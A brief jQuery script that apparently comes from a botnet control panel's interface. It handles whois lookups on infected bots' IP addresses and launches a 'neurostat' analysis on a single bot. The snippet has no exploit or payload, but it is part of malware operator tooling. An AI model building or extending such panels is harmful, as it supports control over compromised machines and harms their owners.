$(function(){
    // Whois renew
    $('#m-botsaction-fullinfo div.bot-whois-info a').click(function(){
        var $this = $(this);
        var $display = $this.parent().find('span');

        $display.text('...');

        var ip_addr = $this.data('ip');
        var botid = $this.data('botid');
        $.get('?m=botnet_socks&ajax=whois', {ip: ip_addr, reset_bot: botid}, function(whois){
            $display.text(whois.join(' '));
        });

        return false;
    });

    // Analysis launch
    $('#neurostat_single_bot').click(function(){
        var $this = $(this);

        var analyses_select = $('script#neurostat_single_bot_analyses_script').html();
        var $form = $(analyses_select).appendTo('body').offset( $this.offset() );
        $form.submit(function(e){
            $.get($form.attr('action'), $form.serialize(), function(data, status, xhr){
                if (xhr.readyState == 4){
                    var location = xhr.getResponseHeader("X-Location");
                    if (location && location.length)
                        window.location.href = location;
                }
            });
            e.preventDefault();
        });
        return false;
    });
});
